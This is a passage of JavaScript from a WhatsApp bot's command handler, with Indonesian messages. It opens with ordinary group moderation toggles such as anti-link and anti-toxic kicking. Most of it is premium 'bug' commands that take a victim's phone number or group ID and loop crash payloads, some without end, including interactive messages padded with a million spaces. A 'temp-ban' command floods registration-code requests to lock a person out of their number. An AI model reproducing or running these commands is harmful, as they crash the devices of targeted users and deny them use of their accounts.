}
break
//=================================================//
case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return m.reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return m.reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return m.reply('_Sudah Diaktifkan_')
ntilinkytch.push(m.chat)
fs.writeFileSync('./dtbs/enable/antilinkytchannel.json', JSON.stringify(ntilinkytch))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await ryozingod.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ryozingod.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link channel youtube di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return m.reply('_Sudah Dimatikan_')
let off = ntilinkytch.indexOf(m.chat)
fs.writeFileSync('./dtbs/enable/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return m.reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return m.reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkInstagram) return m.reply('_Sudah Diaktifkan_')
ntilinkig.push(m.chat)
fs.writeFileSync('./dtbs/enable/antilinkinstagram.json', JSON.stringify(ntilinkig))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await ryozingod.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ryozingod.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim instagram link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return m.reply('_Sudah Dimatikan_')
let off = ntilinkig.indexOf(m.chat)
ntilinkig.splice(off, 1)
fs.writeFileSync('./dtbs/enable/antilinkinstagram.json', JSON.stringify(ntilinkig))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return m.reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return m.reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkFacebook) return m.reply('_Sudah Diaktifkan_')
ntilinkfb.push(m.chat)
fs.writeFileSync('./dtbs/enable/antilinkfacebook.json', JSON.stringify(ntilinkfb))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await ryozingod.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ryozingod.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim facebook link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return m.reply('_Sudah Dimatikan_')
let off = ntilinkfb.indexOf(m.chat)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./dtbs/enable/antilinkfacebook.json', JSON.stringify(ntilinkfb))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return m.reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return m.reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkTelegram) return m.reply('_Sudah Diaktifkan_')
ntilinktg.push(m.chat)
fs.writeFileSync('./dtbs/enable/antilinktelegram.json', JSON.stringify(ntilinktg))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await ryozingod.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ryozingod.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim telegram link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return m.reply('_Sudah Dimatikan_')
let off = ntilinktg.indexOf(m.chat)
ntilinktg.splice(off, 1)
fs.writeFileSync('./dtbs/enable/antilinktelegram.json', JSON.stringify(ntilinktg))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return m.reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return m.reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkTiktok) return m.reply('_Sudah Diaktifkan_')
ntilinktt.push(m.chat)
fs.writeFileSync('./dtbs/enable/antilinktiktok.json', JSON.stringify(ntilinktt))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await ryozingod.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ryozingod.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim tiktok link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return m.reply('_Sudah Dimatikan_')
let off = ntilinktt.indexOf(m.chat)
ntilinktt.splice(off, 1)
fs.writeFileSync('./dtbs/enable/antilinktiktok.json', JSON.stringify(ntilinktt))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return m.reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return m.reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkTwitter) return m.reply('_Sudah Diaktifkan_')
ntilinktwt.push(m.chat)
fs.writeFileSync('./dtbs/enable/antilinktwitter.json', JSON.stringify(ntilinktwt))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await ryozingod.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ryozingod.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim twitter link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return m.reply('_Sudah Dimatikan_')
let off = ntilinktwt.indexOf(m.chat)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./dtbs/enable/antilinktwitter.json', JSON.stringify(ntilinktwt))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkall': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return m.reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return m.reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkTwitter) return m.reply('_Sudah Diaktifkan_')
ntilinkall.push(m.chat)
fs.writeFileSync('./dtbs/enable/antilinkall.json', JSON.stringify(ntilinkall))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await ryozingod.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ryozingod.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim link apapun di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return m.reply('_Sudah Dimatikan_')
let off = ntilinkall.indexOf(m.chat)
ntilinkall.splice(off, 1)
fs.writeFileSync('./dtbs/enable/antilinkall.json', JSON.stringify(ntilinkall))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antitoxic': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return m.reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return m.reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiToxic) return m.reply('_Sudah Diaktifkan_')
nttoxic.push(m.chat)
fs.writeFileSync('./dtbs/enable/antitoxic.json', JSON.stringify(nttoxic))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await ryozingod.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ryozingod.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada yang diperbolehkan menggunakan kata-kata buruk di grup ini, yang menggunakan akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiToxic) return m.reply('_Sudah Dimatikan_')
let off = nttoxic.indexOf(m.chat)
nttoxic.splice(off, 1)
fs.writeFileSync('./dtbs/enable/antitoxic.json', JSON.stringify(nttoxic))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case "antiasing":{
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return m.reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return m.reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiAsing) return m.reply('_Sudah Diaktifkan_')
ntasing.push(m.chat)
fs.writeFileSync('./dtbs/enable/antiasing.json', JSON.stringify(ntasing))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
} else if (args[0] === "off") {
if (!AntiAsing) return m.reply('_Sudah Dimatikan_')
let off = ntasing.indexOf(m.chat)
ntasing.splice(off, 1)
fs.writeFileSync('./dtbs/enable/antiasing.json', JSON.stringify(ntasing))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antiwame': {
if (!m.isGroup) return m.reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return m.reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isDeveloper) return m.reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiWame) return m.reply('_Sudah Diaktifkan_')
ntwame.push(m.chat)
fs.writeFileSync('./dtbs/enable/antiwame.json', JSON.stringify(ntwame))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await ryozingod.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ryozingod.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada yang boleh mengirim wa.me di grup ini, siapa yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiWame) return m.reply('_Sudah Dimatikan_')
let off = ntwame.indexOf(m.chat)
ntwame.splice(off, 1)
fs.writeFileSync('./dtbs/enable/antiwame.json', JSON.stringify(ntwame))
m.reply(`_Sukses matikan ${command} di group ini_`)
}
}
break
//=================================================//
case "antitoxic":{
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (welcmm) return m.reply('Sudah Aktif')
wlcmm.push(m.chat)
var groupe = await ryozingod.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
ryozingod.sendMessage(m.chat, {text: `Fitur Anti Toxic Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcmm) return m.reply('Sudah Non Aktif')
let off = wlcmm.indexOf(m.chat)
wlcmm.splice(off, 1)
m.reply('Sukses Mematikan Anti Toxic  di group ini')
}
}
break

//Islamic

//=================================================//

//=================================================//
case 'spdr': case 'spdr-1': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 254392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 254392784527`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'fatal-notif': case 'fatal-ui': case 'crash-total': case 'forces-sql': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 254392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 254392784527`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'samsung-chace': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 254392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 254392784527`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'stardust': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 254392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 254392784527`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 40; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'bug-rom': case 'restart-ui': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 254392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 254392784527`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'virg4m': case 'bijibapakkau': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 254392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 254392784527`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 10; j++) {
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'sipilist': case '1hit': case 'mimir': case '1shoot': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 254392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 254392784527`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 1; j++) {
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'st4rdust': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 254392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 254392784527`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 3; j++) {
await ngeloc(target, force)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'brutal-bug': case 'bug-24j': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 254392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 254392784527`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (;;) {
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await sleep(30000)
}
}
break
//=================================================//
case 'samsun': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 254392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 254392784527`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
  for (;;) {
    await ngeloc(target, ryobug)
  }
}
break
//=================================================//
case 'ios-try': case 'vios-unli': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 254392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 254392784527`)
await joreply(mess.bugrespon)
let target = bijipler + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break
//=================================================//
case 'dead-ios': case 'bug-ipong': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 254392784527|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 254392784527|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
m.reply(ppk + " detik");
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
await aipong(target)
await sleep(1500)
}
joreply(`👤 Succes Send Bug Ke ${target} dalam kurun waktu ${ppk} detik`)
}
break
//=================================================//
case 'bug-button': case 'bug-browser': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} https://chat.whatsapp.com/`)
joreply(mess.bugrespon)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await ryozingod.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮"
    },
    "footer": {
      "text": "›          #ryozingoddominate"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻Taira Makino⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
joreply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'bug-gc': case 'kill-gc': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1962623836281@g.us`)
joreply(mess.bugrespon)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "✳️࿆͆᷍T̸̨̥͔͚͍͙̰̽̾̿̋͂͂ą̸̡̻̬̫͈̦͎͙̪́̾͋͋̈́̽̉̈́͘i̴̟͚͈̻̞̖͂͊̓͗͛r̵̟̣̰̜̣̤͔̺͎̘̂̈́̌͘͠á̸̧̦̜̮͖̙̲͉̯̿̔̄̅͘ͅ ̴̱̤̭͒͌́̍̌̂̾͌̌͝M̷̡̯͔͚͈̜͔͗a̶̫̩̮͕̙͓͚̠͒k̷͔̠̪̤̙̀̊̉̇͂̈́͌̄̑͠ì̷͕̱͎̳̫͊̓̒̓n̴͔̱̂ỡ̷̱͕̮̈́͆̋͊͘͜͝╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮"
    },
    "footer": {
      "text": "›          #ryozingoddominate"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻ Taira Makino⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
joreply(`<✓> Successfully Send Bug to ${target} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'temp-ban': {
if (!isPremium) return joreply(mess.prem)
if (!text) return joreply(`Example: ${prefix + command} 62|87872627288`)
if (!/|/.test(text)) return joreply(`Data yang anda berikan tidak valid!, Contoh: \n ${command} 62|87872627288`)
let numbers = JSON.parse(fs.readFileSync('./tb.json'))

let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number

await joreply(`❗ Sukses! Gangguan Registrasi telah berhasil diaktifkan ke target : ${fullNo} menggunakan ${command} dalam jangka waktu tak terbatas ✅. Gangguan registrasi akan dihentikan jika server di-restart, mati, atau down Ⓜ️.`)

let { state, saveCreds } = await useMultiFileAuthState('tb')

let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})

let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})

if (res.reason === 'temporarily_unavailable') {
console.log(`Nomor Invalid (Kemungkinan Registrasi Terganggu): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}

numbers[fullNo] = { cCode, number };
fs.writeFileSync('./tb.json', JSON.stringify(numbers, null, '\t'));
setInterval(() => {
dropNumber()
}, 400)
}
break
//=================================================//
//=================================================//
//=================================================//
/*case 'unbanv1': {
if (!isPremium) return joreply(mess.premium)
